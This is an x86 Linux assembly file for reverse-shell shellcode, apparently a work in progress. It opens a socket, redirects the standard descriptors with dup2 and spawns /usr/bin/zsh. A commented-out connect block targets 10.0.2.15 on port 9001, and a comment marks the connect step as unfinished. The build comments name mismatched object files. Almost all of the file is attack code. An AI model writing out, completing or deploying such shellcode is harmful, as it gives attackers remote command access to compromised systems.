; COMPILE : nasm -f elf32 asmrevshell.asm -o bind.o
; EXEC : ld -z execstack -o asmrevshell asmrevshell.o -m elf_i386



global _start

section .text
_start: 

        ; clear registers
        XOR EAX, EAX     ; set EAX to zero
        XOR EBX, EBX     ; set EBX to zero
        XOR ECX, ECX     ; set ECX to zero
        XOR EDX, EDX     ; set EDX to zero

        ; socket syscall
        MOV AX, 0x167    ; 0x167 is hex syscall to socket
        MOV BL, 2        ; set domain argument
        MOV CL, 1        ; set type argument
        MOV DL, 6        ; set protocol argument
        INT 0x80         ; interrupt

        MOV EDI, EAX     ; as result of socket syscall descriptor is saved in EAX
                         ; descriptor will be used with several other syscalls so
                         ; we need to save it some how for later use. One way is
                         ; to save it in EDI register which is least likely to be 
                         ; used in following syscalls



;        XOR EAX, EAX
;        MOV AX, 0x16A

;        XOR  ECX, ECX    ; clear ECX so that we can push zero to the stack
;        PUSH ECX         ; push zero_sin = 0 to the stack
;        PUSH 0x0f02000a  ; push remote IP address 10.0.2.15 to the stack in reverse order due to little endian
;        PUSH word 0x2923 ; push hex 0x2923 (dec 9001) in reverse order due to little endian
;        PUSH word 0x02   ; push hex 0x02 (dec 2) on the stack. 2 represents AF_INET

;        MOV EBX, EAX     ; copy value from EAX to EBX, EAX holds pointer to socket descriptor as result of socket call
;        MOV ECX, ESP     ; move address pointing to the top of the stack to ECX
;        MOV DL, 0x16     ; move value 0x16 to EDX as third parameter
;        INT 0x80         ; interrupt


        ; connect syscall
        ; to be done..

        ; dup2 syscall
        MOV CL, 0x3     ; putting 3 in the counter

LOOP_DUP2:
        XOR EAX, EAX    ; clear EAX
        MOV AL, 0x3F    ; putting the syscall code in EAX
        MOV EBX, EDI    ; putting our new socket descriptor in EBX
        DEC CL          ; decrementing CL by one (so at first CL will be 2 then 1 and then 0)
        INT 0x80        ; interrupt
        JNZ LOOP_DUP2   ; "jump non zero" jumping back to the top of LOOP_DUP2 if the zero flag is not set

 
        ; execve syscall 
        XOR EAX, EAX
        PUSH EAX
        PUSH 0x68737a2f ; ASCII for /usr/bin/zsh (little endian), ("/ Z S H ")
        PUSH 0x6e69622f ; (" / B I N ")
        PUSH 0x7273752F ; (" / U S R ")
        MOV EBX, ESP
        PUSH EAX
        MOV EDX, ESP
        PUSH EBX
        MOV ECX, ESP
        MOV AL, 0x0B
        INT 0x80

